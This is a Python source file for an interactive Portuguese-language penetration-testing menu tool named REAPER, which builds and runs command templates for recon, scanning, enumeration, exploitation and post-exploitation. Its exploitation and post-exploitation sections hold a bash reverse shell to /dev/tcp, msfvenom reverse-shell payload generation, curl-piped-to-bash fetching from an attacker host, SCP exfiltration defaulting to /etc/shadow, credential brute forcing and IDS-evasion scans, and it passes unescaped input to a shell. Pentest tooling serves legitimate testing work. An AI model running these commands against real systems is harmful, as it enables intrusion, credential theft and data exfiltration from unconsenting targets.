#!/usr/bin/env python3
# ============================================================
#  REAPER — Recon, Exploit, Analysis & Post-exploitation
#           Reporting Engine
#  Autor: DarkReaper
# ============================================================

import os, sys, json, datetime, shutil, subprocess
from pathlib import Path
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.text import Text
from rich.prompt import Prompt, Confirm
from rich.rule import Rule
from rich.align import Align
from rich import box
from rich.columns import Columns

console = Console()

INTEL_OK = True

PHASE_COLORS = ["cyan","green","magenta","yellow","red","bright_red","blue"]

# ── Ferramentas executáveis por fase ────────────────────────
# Cada ferramenta tem: nome, descrição, lista de parâmetros a pedir, template do comando
# {TARGET} = IP/domínio alvo do projecto  {PORTA} = porto
TOOL_DEFINITIONS = {

    # ── FASE 1 — Reconhecimento ──────────────────────────────
    1: [
        {
            "name": "whois",
            "desc": "Registo de domínio, IPs e contactos",
            "params": [
                {"key": "alvo", "label": "Domínio ou IP alvo", "default": "{TARGET}"},
            ],
            "cmd": "whois {alvo}",
        },
        {
            "name": "nslookup",
            "desc": "Resolução DNS básica",
            "params": [
                {"key": "alvo", "label": "Domínio", "default": "{TARGET}"},
            ],
            "cmd": "nslookup {alvo}",
        },
        {
            "name": "dig",
            "desc": "DNS completo — A, MX, NS, TXT",
            "params": [
                {"key": "alvo",  "label": "Domínio",              "default": "{TARGET}"},
                {"key": "tipo",  "label": "Tipo de registo",       "default": "ANY"},
            ],
            "cmd": "dig {alvo} {tipo}",
        },
        {
            "name": "dig axfr",
            "desc": "Tentativa de transferência de zona DNS",
            "params": [
                {"key": "dominio",    "label": "Domínio",        "default": "{TARGET}"},
                {"key": "dns_server", "label": "Servidor DNS",   "default": "8.8.8.8"},
            ],
            "cmd": "dig axfr {dominio} @{dns_server}",
        },
        {
            "name": "theHarvester",
            "desc": "Emails, subdomínios, IPs via OSINT",
            "params": [
                {"key": "dominio", "label": "Domínio alvo",    "default": "{TARGET}"},
                {"key": "fonte",   "label": "Fonte (all/google/bing)", "default": "all"},
            ],
            "cmd": "theHarvester -d {dominio} -b {fonte}",
        },
        {
            "name": "netdiscover",
            "desc": "Descoberta de hosts na rede local",
            "params": [
                {"key": "rede", "label": "Rede (ex: 192.168.1.0/24)", "default": ""},
            ],
            "cmd": "netdiscover -r {rede}",
        },
        {
            "name": "ping sweep (nmap)",
            "desc": "Hosts activos na rede",
            "params": [
                {"key": "rede", "label": "Rede (ex: 192.168.1.0/24)", "default": ""},
            ],
            "cmd": "nmap -sn {rede}",
        },
        {
            "name": "traceroute",
            "desc": "Rota de rede até ao alvo",
            "params": [
                {"key": "alvo", "label": "IP / Domínio alvo", "default": "{TARGET}"},
            ],
            "cmd": "traceroute {alvo}",
        },
    ],

    # ── FASE 2 — Scanning ────────────────────────────────────
    2: [
        {
            "name": "nmap básico",
            "desc": "Versões, scripts padrão e SO",
            "params": [
                {"key": "alvo", "label": "IP / Domínio alvo", "default": "{TARGET}"},
            ],
            "cmd": "nmap -sV -sC -O {alvo}",
        },
        {
            "name": "nmap completo",
            "desc": "Todos os portos, agressivo",
            "params": [
                {"key": "alvo",   "label": "IP / Domínio alvo",   "default": "{TARGET}"},
                {"key": "output", "label": "Ficheiro de output",   "default": "scan_{alvo}.txt"},
            ],
            "cmd": "nmap -sS -sV -sC -O -p- -T4 -A {alvo} -oN {output}",
        },
        {
            "name": "nmap UDP",
            "desc": "Top 100 portos UDP",
            "params": [
                {"key": "alvo", "label": "IP / Domínio alvo", "default": "{TARGET}"},
            ],
            "cmd": "nmap -sU --top-ports 100 {alvo}",
        },
        {
            "name": "nmap scripts vuln",
            "desc": "Scripts NSE de vulnerabilidades",
            "params": [
                {"key": "alvo",   "label": "IP / Domínio alvo", "default": "{TARGET}"},
                {"key": "portos", "label": "Portos (ex: 80,443 ou all)", "default": ""},
            ],
            "cmd": "nmap --script vuln -p {portos} {alvo}",
        },
        {
            "name": "nmap evasão firewall",
            "desc": "Fragmentação + decoy para evasão IDS",
            "params": [
                {"key": "alvo", "label": "IP / Domínio alvo", "default": "{TARGET}"},
            ],
            "cmd": "nmap -f -D RND:10 {alvo}",
        },
        {
            "name": "masscan",
            "desc": "Scan rápido de todos os portos",
            "params": [
                {"key": "alvo", "label": "IP / Domínio alvo", "default": "{TARGET}"},
                {"key": "rate", "label": "Rate (pacotes/seg)",  "default": "1000"},
            ],
            "cmd": "masscan -p1-65535 {alvo} --rate={rate}",
        },
    ],

    # ── FASE 3 — Enumeração ──────────────────────────────────
    3: [
        {
            "name": "gobuster",
            "desc": "Fuzzing de directorias web",
            "params": [
                {"key": "url",      "label": "URL alvo (ex: http://192.168.1.1)", "default": "http://{TARGET}"},
                {"key": "wordlist", "label": "Wordlist", "default": "/usr/share/wordlists/dirb/common.txt"},
                {"key": "ext",      "label": "Extensões (ex: php,html,txt)",      "default": "php,html,txt"},
                {"key": "output",   "label": "Ficheiro output",                    "default": "gobuster_{TARGET}.txt"},
            ],
            "cmd": "gobuster dir -u {url} -w {wordlist} -x {ext} -o {output}",
        },
        {
            "name": "feroxbuster",
            "desc": "Fuzzing recursivo de directorias web",
            "params": [
                {"key": "url",      "label": "URL alvo (ex: http://192.168.1.1)", "default": "http://{TARGET}"},
                {"key": "wordlist", "label": "Wordlist", "default": "/usr/share/wordlists/dirb/common.txt"},
                {"key": "ext",      "label": "Extensões (ex: php,html)",          "default": "php,html"},
                {"key": "depth",    "label": "Profundidade recursiva",             "default": "3"},
                {"key": "output",   "label": "Ficheiro output",                    "default": "ferox_{TARGET}.txt"},
            ],
            "cmd": "feroxbuster -u {url} -w {wordlist} -x {ext} -d {depth} -o {output}",
        },
        {
            "name": "dirb",
            "desc": "Enumeração de directorias web",
            "params": [
                {"key": "url",      "label": "URL alvo",  "default": "http://{TARGET}"},
                {"key": "wordlist", "label": "Wordlist (ENTER para padrão)", "default": ""},
            ],
            "cmd": "dirb {url} {wordlist}",
        },
        {
            "name": "nikto",
            "desc": "Scanner de vulnerabilidades web",
            "params": [
                {"key": "alvo",   "label": "IP / URL alvo",       "default": "{TARGET}"},
                {"key": "porto",  "label": "Porto",                "default": "80"},
                {"key": "output", "label": "Ficheiro output",      "default": "nikto_{TARGET}.txt"},
            ],
            "cmd": "nikto -h {alvo} -p {porto} -o {output}",
        },
        {
            "name": "wpscan",
            "desc": "Scan WordPress — users, plugins, temas",
            "params": [
                {"key": "url",         "label": "URL WordPress",          "default": "http://{TARGET}"},
                {"key": "enumerate",   "label": "Enumeração (u=users, p=plugins, t=temas, vp=plugins vuln)", "default": "u,vp"},
                {"key": "wordlist",    "label": "Wordlist passwords (ENTER para saltar)", "default": ""},
            ],
            "cmd": "wpscan --url {url} -e {enumerate} --passwords {wordlist}",
        },
        {
            "name": "enum4linux",
            "desc": "Enumeração SMB/Samba completa",
            "params": [
                {"key": "alvo", "label": "IP alvo", "default": "{TARGET}"},
            ],
            "cmd": "enum4linux -a {alvo}",
        },
        {
            "name": "smbclient",
            "desc": "Listar partilhas SMB",
            "params": [
                {"key": "alvo", "label": "IP alvo", "default": "{TARGET}"},
            ],
            "cmd": "smbclient -L //{alvo} -N",
        },
        {
            "name": "smbmap",
            "desc": "Mapeamento de partilhas e permissões SMB",
            "params": [
                {"key": "alvo", "label": "IP alvo", "default": "{TARGET}"},
            ],
            "cmd": "smbmap -H {alvo}",
        },
        {
            "name": "nikto SSL",
            "desc": "Scanner web com SSL/HTTPS",
            "params": [
                {"key": "alvo",  "label": "IP / URL alvo", "default": "{TARGET}"},
                {"key": "porto", "label": "Porto SSL",      "default": "443"},
            ],
            "cmd": "nikto -h {alvo} -p {porto} -ssl",
        },
        {
            "name": "snmpwalk",
            "desc": "Enumeração SNMP",
            "params": [
                {"key": "alvo",      "label": "IP alvo",          "default": "{TARGET}"},
                {"key": "community", "label": "Community string",  "default": "public"},
            ],
            "cmd": "snmpwalk -v2c -c {community} {alvo}",
        },
        {
            "name": "nmap ssh-enum",
            "desc": "Métodos de autenticação SSH",
            "params": [
                {"key": "alvo", "label": "IP alvo", "default": "{TARGET}"},
            ],
            "cmd": "nmap -p 22 --script ssh-auth-methods {alvo}",
        },
        {
            "name": "ftp anónimo",
            "desc": "Testar acesso FTP anónimo",
            "params": [
                {"key": "alvo", "label": "IP alvo", "default": "{TARGET}"},
            ],
            "cmd": "ftp {alvo}",
        },
    ],

    # ── FASE 4 — Análise de Vulnerabilidades ─────────────────
    4: [
        {
            "name": "nmap --script vuln",
            "desc": "Scripts NSE de vulnerabilidades em todos os portos",
            "params": [
                {"key": "alvo",   "label": "IP / Domínio alvo",              "default": "{TARGET}"},
                {"key": "portos", "label": "Portos (ENTER para todos abertos)", "default": ""},
            ],
            "cmd": "nmap --script vuln -sV {alvo}",
        },
        {
            "name": "searchsploit",
            "desc": "Pesquisa local de exploits no ExploitDB",
            "params": [
                {"key": "servico", "label": "Serviço / software",  "default": ""},
                {"key": "versao",  "label": "Versão (ex: 2.4.49)", "default": ""},
            ],
            "cmd": "searchsploit {servico} {versao}",
        },
        {
            "name": "searchsploit -x",
            "desc": "Ver código de um exploit específico",
            "params": [
                {"key": "path", "label": "Caminho do exploit (ex: linux/remote/12345.py)", "default": ""},
            ],
            "cmd": "searchsploit -x {path}",
        },
        {
            "name": "searchsploit -m",
            "desc": "Copiar exploit para directoria actual",
            "params": [
                {"key": "path", "label": "Caminho do exploit", "default": ""},
            ],
            "cmd": "searchsploit -m {path}",
        },
        {
            "name": "nmap vulners",
            "desc": "CVEs automáticos por versão de serviço",
            "params": [
                {"key": "alvo", "label": "IP / Domínio alvo", "default": "{TARGET}"},
            ],
            "cmd": "nmap --script vulners -sV {alvo}",
        },
        {
            "name": "nuclei",
            "desc": "Scanner de vulnerabilidades web com templates",
            "params": [
                {"key": "url",       "label": "URL alvo",                "default": "http://{TARGET}"},
                {"key": "severity",  "label": "Severidade (critical,high,medium)", "default": "critical,high"},
            ],
            "cmd": "nuclei -u {url} -s {severity}",
        },
        {
            "name": "msfconsole search",
            "desc": "Pesquisar módulos no Metasploit",
            "params": [
                {"key": "termo", "label": "Serviço / CVE / produto", "default": ""},
            ],
            "cmd": "msfconsole -q -x 'search {termo}; exit'",
        },
    ],

    # ── FASE 5 — Exploração ──────────────────────────────────
    5: [
        {
            "name": "hydra SSH",
            "desc": "Brute force SSH",
            "params": [
                {"key": "alvo",     "label": "IP alvo",                          "default": "{TARGET}"},
                {"key": "user",     "label": "Utilizador (ou ficheiro -L)",       "default": "root"},
                {"key": "wordlist", "label": "Wordlist passwords",                "default": "/usr/share/wordlists/rockyou.txt"},
                {"key": "threads",  "label": "Threads",                           "default": "4"},
            ],
            "cmd": "hydra -l {user} -P {wordlist} -t {threads} ssh://{alvo}",
        },
        {
            "name": "hydra FTP",
            "desc": "Brute force FTP",
            "params": [
                {"key": "alvo",     "label": "IP alvo",          "default": "{TARGET}"},
                {"key": "user",     "label": "Utilizador",        "default": "admin"},
                {"key": "wordlist", "label": "Wordlist passwords","default": "/usr/share/wordlists/rockyou.txt"},
            ],
            "cmd": "hydra -l {user} -P {wordlist} ftp://{alvo}",
        },
        {
            "name": "hydra HTTP form",
            "desc": "Brute force formulário web",
            "params": [
                {"key": "alvo",     "label": "IP alvo",                        "default": "{TARGET}"},
                {"key": "path",     "label": "Path do login (ex: /login.php)", "default": "/login.php"},
                {"key": "user",     "label": "Utilizador",                     "default": "admin"},
                {"key": "wordlist", "label": "Wordlist passwords",             "default": "/usr/share/wordlists/rockyou.txt"},
                {"key": "fail_str", "label": "String de falha (ex: Invalid)",  "default": "Invalid"},
            ],
            "cmd": "hydra -l {user} -P {wordlist} {alvo} http-post-form '{path}:username=^USER^&password=^PASS^:F={fail_str}'",
        },
        {
            "name": "john",
            "desc": "Cracking de hashes com John the Ripper",
            "params": [
                {"key": "hash_file","label": "Ficheiro com hash(es)",           "default": "hash.txt"},
                {"key": "wordlist", "label": "Wordlist",                        "default": "/usr/share/wordlists/rockyou.txt"},
                {"key": "formato",  "label": "Formato (ex: md5, sha256, auto)", "default": ""},
            ],
            "cmd": "john --wordlist={wordlist} {hash_file}",
        },
        {
            "name": "hashcat",
            "desc": "Cracking GPU de hashes",
            "params": [
                {"key": "modo",     "label": "Modo (-m): 0=MD5 100=SHA1 1800=sha512crypt", "default": "0"},
                {"key": "hash_file","label": "Ficheiro com hash",               "default": "hash.txt"},
                {"key": "wordlist", "label": "Wordlist",                        "default": "/usr/share/wordlists/rockyou.txt"},
            ],
            "cmd": "hashcat -m {modo} {hash_file} {wordlist}",
        },
        {
            "name": "msfvenom payload",
            "desc": "Gerar payload de reverse shell",
            "params": [
                {"key": "payload",  "label": "Payload (ex: linux/x86/shell_reverse_tcp)", "default": "linux/x86/shell_reverse_tcp"},
                {"key": "lhost",    "label": "Teu IP (LHOST)",                            "default": ""},
                {"key": "lport",    "label": "Porta (LPORT)",                             "default": "4444"},
                {"key": "formato",  "label": "Formato (elf/exe/py/php/raw)",              "default": "elf"},
                {"key": "output",   "label": "Ficheiro output",                           "default": "shell.elf"},
            ],
            "cmd": "msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f {formato} -o {output}",
        },
        {
            "name": "reverse shell bash",
            "desc": "Gerar comando de reverse shell Bash",
            "params": [
                {"key": "lhost", "label": "Teu IP (ouvinte)", "default": ""},
                {"key": "lport", "label": "Porta",            "default": "4444"},
            ],
            "cmd": "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
        },
        {
            "name": "netcat listener",
            "desc": "Abrir listener para receber reverse shell",
            "params": [
                {"key": "lport", "label": "Porta de escuta", "default": "4444"},
            ],
            "cmd": "nc -lvnp {lport}",
        },
        {
            "name": "sqlmap",
            "desc": "SQL Injection automático",
            "params": [
                {"key": "url",    "label": "URL vulnerável (ex: http://alvo/page?id=1)", "default": ""},
                {"key": "level",  "label": "Nível (1-5)",                                "default": "3"},
                {"key": "risk",   "label": "Risco (1-3)",                                "default": "2"},
            ],
            "cmd": "sqlmap -u '{url}' --level={level} --risk={risk} --dbs --batch",
        },
    ],

    # ── FASE 6 — Pós-Exploração ──────────────────────────────
    6: [
        {
            "name": "whoami & id",
            "desc": "Utilizador actual e grupos",
            "params": [],
            "cmd": "whoami && id",
        },
        {
            "name": "uname",
            "desc": "Kernel, arquitectura e sistema",
            "params": [],
            "cmd": "uname -a && cat /etc/os-release",
        },
        {
            "name": "sudo -l",
            "desc": "Comandos sudo sem password",
            "params": [],
            "cmd": "sudo -l",
        },
        {
            "name": "SUID binários",
            "desc": "Procurar binários com SUID activado",
            "params": [],
            "cmd": "find / -perm -4000 2>/dev/null",
        },
        {
            "name": "SGID binários",
            "desc": "Procurar binários com SGID activado",
            "params": [],
            "cmd": "find / -perm -2000 2>/dev/null",
        },
        {
            "name": "crontab",
            "desc": "Tarefas agendadas do sistema",
            "params": [],
            "cmd": "crontab -l 2>/dev/null; cat /etc/crontab 2>/dev/null",
        },
        {
            "name": "capabilities",
            "desc": "Capabilities especiais de binários",
            "params": [],
            "cmd": "getcap -r / 2>/dev/null",
        },
        {
            "name": "linpeas (remoto)",
            "desc": "Executa linpeas via HTTP do teu servidor",
            "params": [
                {"key": "lhost", "label": "Teu IP (servidor HTTP)", "default": ""},
                {"key": "output","label": "Ficheiro output",         "default": "linpeas_out.txt"},
            ],
            "cmd": "curl http://{lhost}/linpeas.sh | bash | tee {output}",
        },
        {
            "name": "linpeas (local)",
            "desc": "Executa linpeas já transferido",
            "params": [
                {"key": "output","label": "Ficheiro output", "default": "linpeas_out.txt"},
            ],
            "cmd": "chmod +x linpeas.sh && ./linpeas.sh | tee {output}",
        },
        {
            "name": "/etc/passwd",
            "desc": "Listar utilizadores do sistema",
            "params": [],
            "cmd": "cat /etc/passwd",
        },
        {
            "name": "history",
            "desc": "Histórico de comandos do utilizador",
            "params": [],
            "cmd": "cat ~/.bash_history",
        },
        {
            "name": "rede interna",
            "desc": "Interfaces, IPs e portos internos activos",
            "params": [],
            "cmd": "ip a && ss -tulnp",
        },
        {
            "name": "exfiltração SCP",
            "desc": "Copiar ficheiro para a tua máquina",
            "params": [
                {"key": "ficheiro", "label": "Ficheiro a exfiltrar",       "default": "/etc/shadow"},
                {"key": "lhost",    "label": "Teu IP",                     "default": ""},
                {"key": "dest",     "label": "Destino (ex: /tmp/loot/)",   "default": "/tmp/loot/"},
            ],
            "cmd": "scp {ficheiro} {lhost}:{dest}",
        },
    ],
}

# ── Estrutura das 7 fases ───────────────────────────────────
PHASES = [
    {
        "id": 1, "name": "RECONHECIMENTO",
        "subtitle": "Recolha passiva de informação",
        "icon": "🔍",
        "desc": "Recolha de informação sem interagir directamente com o alvo. Mapeamento da superfície de ataque.",
        "fields": [
            ("alvo_ip",      "IP / Domínio alvo"),
            ("rede",         "Rede (ex: 192.168.1.0/24)"),
            ("hosts_ativos", "Hosts activos encontrados"),
            ("dns_info",     "Informação DNS recolhida"),
            ("emails",       "Emails / utilizadores encontrados"),
            ("notas",        "Notas gerais"),
        ]
    },
    {
        "id": 2, "name": "SCANNING / VARREDURA",
        "subtitle": "Varredura activa de portos e serviços",
        "icon": "📡",
        "desc": "Interacção directa com o alvo para identificar portos abertos, serviços e sistema operativo.",
        "fields": [
            ("portos_tcp",  "Portos TCP abertos"),
            ("portos_udp",  "Portos UDP abertos"),
            ("servicos",    "Serviços identificados"),
            ("so",          "Sistema Operativo detectado"),
            ("versoes",     "Versões de serviços"),
            ("notas",       "Notas gerais"),
        ]
    },
    {
        "id": 3, "name": "ENUMERAÇÃO",
        "subtitle": "Extracção detalhada de informação dos serviços",
        "icon": "🗂️",
        "desc": "Enumeração profunda de cada serviço — utilizadores, directorias, versões, configurações.",
        "fields": [
            ("diretorias_web","Directorias/ficheiros web encontrados"),
            ("utilizadores",  "Utilizadores enumerados"),
            ("partilhas_smb", "Partilhas SMB encontradas"),
            ("cms_info",      "CMS / versão (WordPress, Joomla, etc.)"),
            ("plugins_vulns", "Plugins / componentes vulneráveis"),
            ("notas",         "Notas gerais"),
        ]
    },
    {
        "id": 4, "name": "ANÁLISE DE VULNERABILIDADES",
        "subtitle": "Identificação e validação de vulnerabilidades",
        "icon": "🔬",
        "desc": "Análise das vulnerabilidades encontradas, pesquisa de exploits e validação de CVEs.",
        "fields": [
            ("cves",         "CVEs identificados"),
            ("exploits",     "Exploits disponíveis encontrados"),
            ("risco",        "Nível de risco (Crítico/Alto/Médio/Baixo)"),
            ("vetor_ataque", "Vector de ataque principal"),
            ("notas",        "Notas gerais"),
        ]
    },
    {
        "id": 5, "name": "EXPLORAÇÃO",
        "subtitle": "Execução de exploits e obtenção de acesso",
        "icon": "💥",
        "desc": "Execução controlada de exploits para obter acesso ao sistema alvo.",
        "fields": [
            ("exploit_usado","Exploit / módulo utilizado"),
            ("credenciais",  "Credenciais obtidas"),
            ("acesso",       "Tipo de acesso obtido"),
            ("user_obtido",  "Utilizador com que entrou"),
            ("flags",        "Flags / ficheiros sensíveis"),
            ("notas",        "Notas gerais"),
        ]
    },
    {
        "id": 6, "name": "PÓS-EXPLORAÇÃO",
        "subtitle": "Escalada de privilégios e persistência",
        "icon": "🏴",
        "desc": "Após acesso inicial — escalada de privilégios, recolha interna e movimentação lateral.",
        "fields": [
            ("privilegio",     "Nível de privilégio obtido"),
            ("metodo_privesc", "Método de escalada usado"),
            ("root_flag",      "Flag de root / ficheiros sensíveis"),
            ("dados_exfil",    "Dados exfiltrados"),
            ("persistencia",   "Método de persistência instalado"),
            ("notas",          "Notas gerais"),
        ]
    },
    {
        "id": 7, "name": "RELATÓRIO",
        "subtitle": "Documentação e geração do relatório final",
        "icon": "📄",
        "desc": "Compilação de todos os dados recolhidos num relatório profissional.",
        "fields": [
            ("titulo",         "Título do relatório"),
            ("sumario_exec",   "Sumário executivo"),
            ("vulns_criticas", "Vulnerabilidades críticas"),
            ("recomendacoes",  "Recomendações de remediação"),
            ("notas",          "Notas finais"),
        ]
    },
]

# ── Estado global ───────────────────────────────────────────
PROJECT = {
    "name": "", "target": "", "date": "", "tester": "DarkReaper",
    "phases": {str(i): {} for i in range(1, 8)},
}
PROJECT_FILE = ""

# ── Utilitários ─────────────────────────────────────────────
def clear():
    os.system("clear")

def pause():
    console.print("\n[dim]Prima ENTER para continuar...[/dim]")
    input()

def save_project():
    if PROJECT_FILE:
        with open(PROJECT_FILE, "w") as f:
            json.dump(PROJECT, f, indent=2, ensure_ascii=False)

def resolve_defaults(params, target):
    """Substitui {TARGET} nos defaults pelo alvo do projecto."""
    for p in params:
        p["default"] = p["default"].replace("{TARGET}", target)
    return params

# ── Banner ───────────────────────────────────────────────────
def banner():
    clear()
    art = r"""
██████╗ ███████╗ █████╗ ██████╗ ███████╗██████╗ 
██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔════╝██╔══██╗
██████╔╝█████╗  ███████║██████╔╝█████╗  ██████╔╝
██╔══██╗██╔══╝  ██╔══██║██╔═══╝ ██╔══╝  ██╔══██╗
██║  ██║███████╗██║  ██║██║     ███████╗██║  ██║
╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝"""
    console.print(Align.center(Text(art, style="bold red")))
    console.print(Align.center(Text(
        "Recon · Exploit · Analysis · Post-exploitation · Reporting Engine", style="dim red")))
    console.print(Align.center(Text("[ DarkReaper ]", style="bold white")))
    console.print(Rule(style="red"))

# ── Menu Principal ───────────────────────────────────────────
def main_menu():
    while True:
        banner()
        proj_info = (f"[bold cyan]{PROJECT['name']}[/bold cyan]  →  "
                     f"[yellow]{PROJECT['target']}[/yellow]  "
                     f"[dim]{PROJECT['date']}[/dim]") \
                    if PROJECT['name'] else "[dim]Nenhum projecto activo[/dim]"
        console.print(Panel(proj_info, title="Projecto Activo", border_style="red", padding=(0,2)))

        prog = Table(box=box.SIMPLE, show_header=False, padding=(0,1))
        prog.add_column(width=4); prog.add_column(width=32); prog.add_column(width=12)
        for ph in PHASES:
            pid   = str(ph["id"])
            fill  = len([v for v in PROJECT["phases"].get(pid,{}).values() if str(v).strip()])
            total = len(ph["fields"])
            c     = PHASE_COLORS[ph["id"]-1]
            st    = f"[green]●[/green] {fill}/{total}" if fill > 0 else f"[dim]○ 0/{total}[/dim]"
            menu_num = ph["id"] + 2
            prog.add_row(f"[{c}][{menu_num}][/{c}]", f"[{c}]{ph['icon']} {ph['name']}[/{c}]", st)
        console.print(Panel(prog, title="7 Passos", border_style="dim red", padding=(0,1)))
        console.print()

        menu = Table(box=box.SIMPLE, show_header=False, padding=(0,2))
        menu.add_column(style="bold cyan", width=8); menu.add_column()
        menu.add_row("[1]",   "Novo Projecto")
        menu.add_row("[2]",   "Carregar Projecto")
        menu.add_row("[3-9]", "Entrar numa fase (3=Fase1 … 9=Fase7)")
        menu.add_row("[R]",   "Gerar Relatório")
        menu.add_row("[I]",   "Motor de Inteligência — detectar e atacar vectores")
        menu.add_row("[Q]",   "Sair")
        console.print(menu)

        ch = Prompt.ask("[bold red]REAPER[/bold red]").strip().upper()
        if ch == "Q":
            console.print("\n[bold red]Sessão terminada. Stay sharp.[/bold red]\n")
            sys.exit(0)
        elif ch == "1": new_project()
        elif ch == "2": load_project_menu()
        elif ch == "R": report_menu()
        elif ch == "I":
            if INTEL_OK:
                if not PROJECT["name"]:
                    console.print("[yellow]Cria ou carrega um projecto primeiro.[/yellow]")
                    pause()
                else:
                    intelligence_menu(PROJECT, save_project)
            else:
                console.print("[red]Motor de inteligência não disponível.[/red]")
                pause()
        elif ch in [str(i) for i in range(3, 10)]:
            phase_menu(int(ch) - 2)

# ── Novo / Carregar Projecto ────────────────────────────────
def new_project():
    global PROJECT, PROJECT_FILE
    banner()
    console.print(Panel("[bold cyan]NOVO PROJECTO[/bold cyan]", border_style="cyan"))
    name   = Prompt.ask("[cyan]Nome do projecto[/cyan]")
    target = Prompt.ask("[cyan]IP / Domínio alvo[/cyan]")
    date   = datetime.date.today().isoformat()
    PROJECT = {"name": name, "target": target, "date": date, "tester": "DarkReaper",
               "phases": {str(i): {} for i in range(1, 8)}}
    PROJECT["phases"]["1"]["alvo_ip"] = target
    safe = name.replace(" ","_").replace("/","-")
    PROJECT_FILE = f"reaper_{safe}_{date}.json"
    save_project()
    console.print(f"\n[green]✔ Projecto criado:[/green] [bold]{PROJECT_FILE}[/bold]")
    pause()

def load_project_menu():
    global PROJECT, PROJECT_FILE
    banner()
    console.print(Panel("[bold cyan]CARREGAR PROJECTO[/bold cyan]", border_style="cyan"))
    files = list(Path(".").glob("reaper_*.json"))
    if not files:
        console.print("[yellow]Nenhum projecto encontrado nesta directoria.[/yellow]")
        pause(); return
    t = Table(box=box.SIMPLE_HEAD, border_style="dim")
    t.add_column("#", style="bold cyan", width=4)
    t.add_column("Ficheiro"); t.add_column("Modificado", style="dim")
    for i, f in enumerate(files, 1):
        mtime = datetime.datetime.fromtimestamp(f.stat().st_mtime).strftime("%Y-%m-%d %H:%M")
        t.add_row(str(i), f.name, mtime)
    console.print(t)
    ch = Prompt.ask("[cyan]Número (ENTER para cancelar)[/cyan]", default="")
    if ch.isdigit() and 1 <= int(ch) <= len(files):
        with open(files[int(ch)-1]) as f:
            PROJECT = json.load(f)
        PROJECT_FILE = str(files[int(ch)-1])
        console.print(f"\n[green]✔ Projecto carregado.[/green]")
        pause()

# ── Menu de Fase ─────────────────────────────────────────────
def phase_menu(phase_id):
    ph    = PHASES[phase_id - 1]
    color = PHASE_COLORS[phase_id - 1]
    tools = TOOL_DEFINITIONS.get(phase_id, [])

    while True:
        banner()
        console.print(Panel(
            f"[{color}]{ph['icon']}  FASE {ph['id']} — {ph['name']}[/{color}]\n[dim]{ph['desc']}[/dim]",
            border_style=color, padding=(0,2)))
        console.print()

        menu = Table(box=box.SIMPLE, show_header=False, padding=(0,2))
        menu.add_column(style=f"bold {color}", width=6); menu.add_column()
        opt_num = 1
        has_tools = bool(tools)
        if has_tools:
            menu.add_row(f"[{opt_num}]", "Escolher e executar ferramenta")
            tool_opt = str(opt_num); opt_num += 1
        else:
            tool_opt = None
        fill_opt = str(opt_num); menu.add_row(f"[{opt_num}]", "Preencher / Editar dados desta fase"); opt_num += 1
        view_opt = str(opt_num); menu.add_row(f"[{opt_num}]", "Ver dados preenchidos")
        menu.add_row("[B]", "Voltar")
        console.print(menu)

        ch = Prompt.ask(f"[{color}]REAPER › Fase {phase_id}[/{color}]").strip().upper()
        if ch == "B": break
        elif ch == tool_opt and has_tools: tool_selector(ph, color, tools)
        elif ch == fill_opt: fill_phase(ph, color)
        elif ch == view_opt: view_phase_data(ph, color)

# ── Selector de Ferramentas ──────────────────────────────────
def tool_selector(ph, color, tools):
    while True:
        banner()
        console.print(Panel(
            f"[{color}]{ph['icon']} FASE {ph['id']} — {ph['name']} › FERRAMENTAS[/{color}]",
            border_style=color))
        console.print()

        t = Table(box=box.ROUNDED, border_style=color,
                  header_style=f"bold {color}", show_lines=True)
        t.add_column("#",           style=f"bold {color}", width=4, justify="center")
        t.add_column("Ferramenta",  style="bold white",    width=20)
        t.add_column("Descrição",   style="dim white",     width=50)

        for i, tool in enumerate(tools, 1):
            t.add_row(str(i), tool["name"], tool["desc"])

        console.print(t)
        console.print()
        console.print("[dim][número] Escolher ferramenta  [B] Voltar[/dim]")

        ch = Prompt.ask(f"[{color}]Escolha[/{color}]").strip().upper()
        if ch == "B": break
        elif ch.isdigit() and 1 <= int(ch) <= len(tools):
            run_tool(ph, color, tools[int(ch)-1])

# ── Executar Ferramenta ──────────────────────────────────────
def run_tool(ph, color, tool):
    banner()
    console.print(Panel(
        f"[{color}]{ph['icon']} FASE {ph['id']} › {tool['name'].upper()}[/{color}]\n"
        f"[dim]{tool['desc']}[/dim]",
        border_style=color))
    console.print()

    target = PROJECT.get("target", "")
    params = resolve_defaults([dict(p) for p in tool["params"]], target)

    # Recolher parâmetros
    values = {}
    if params:
        console.print(f"[{color}]Parâmetros necessários:[/{color}] [dim](ENTER para aceitar valor sugerido)[/dim]\n")
        for p in params:
            d = p["default"]
            # Se o default é diferente do label, mostra-o; caso contrário só o label
            label_clean = p['label'].lower().replace(" ", "")
            d_clean = d.lower().replace(" ", "")
            show_default = d and d_clean not in label_clean and label_clean not in d_clean
            if show_default:
                label_str = f"  [{color}]{p['label']}[/{color}] [dim]({d})[/dim]"
            else:
                label_str = f"  [{color}]{p['label']}[/{color}]"
            val = Prompt.ask(label_str, default=d)
            values[p["key"]] = val
    else:
        console.print(f"[dim]Este comando não necessita de parâmetros adicionais.[/dim]\n")

    # Montar comando final
    cmd = tool["cmd"]
    for k, v in values.items():
        cmd = cmd.replace("{" + k + "}", v)

    console.print()
    console.print(Panel(f"[bold green]{cmd}[/bold green]",
                        title="Comando Gerado", border_style="green"))
    console.print()

    # Opções
    opts = Table(box=box.SIMPLE, show_header=False, padding=(0,2))
    opts.add_column(style="bold cyan", width=6); opts.add_column()
    opts.add_row("[1]", "Executar agora neste terminal")
    opts.add_row("[2]", "Guardar comando nas notas da fase")
    opts.add_row("[3]", "Executar E guardar")
    opts.add_row("[B]", "Voltar sem fazer nada")
    console.print(opts)

    ch = Prompt.ask(f"[{color}]Acção[/{color}]").strip().upper()

    if ch in ["1", "3"]:
        console.print(f"\n[yellow]A executar:[/yellow] [bold green]{cmd}[/bold green]\n")
        console.print(Rule(style="dim green"))
        try:
            subprocess.run(cmd, shell=True)
        except KeyboardInterrupt:
            console.print("\n[yellow]Interrompido pelo utilizador.[/yellow]")
        console.print(Rule(style="dim green"))

    if ch in ["2", "3"]:
        phase_data = PROJECT["phases"].get(str(ph["id"]), {})
        existing   = phase_data.get("notas", "")
        ts         = datetime.datetime.now().strftime("%H:%M:%S")
        entry      = f"[{ts}] {tool['name']}: {cmd}"
        phase_data["notas"] = (existing + "\n" + entry).strip()
